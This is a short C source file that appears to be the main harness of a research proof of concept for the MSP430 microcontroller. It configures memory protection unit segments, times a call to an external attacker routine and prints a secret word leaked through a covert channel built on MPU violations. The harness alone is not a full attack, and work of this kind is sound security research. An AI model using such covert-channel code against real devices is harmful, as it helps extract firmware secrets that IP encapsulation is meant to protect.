/**
 * MPU covert channel PoC: leak a word of secret information through MPU violations.
 *
 * After launching the debug session, do a hard reset (to activate IPE), then run the code.
 *
 * Expected output:
 * ----------------
 * Leaked word: beef (cycles: 475)
 */

#include <msp430.h>
#include <stdio.h>
#include <stdint.h>

extern int result;

void attacker(void);
uint16_t time;

int main(void)
{
    WDTCTL = WDTPW | WDTHOLD;   // stop watchdog timer

    MPUCTL0 = MPUPW;
    MPUSEGB1 = 0x4C00 >> 4;
    MPUSEGB2 = 0x5400 >> 4;


    TB0CTL = TBSSEL1 | MC1 | TBCLR;
    attacker();
    TB0CTL = 0;
    time = TB0R;

    printf("Leaked word: %x (cycles: %d)\n", result, time);

    return 0;
}
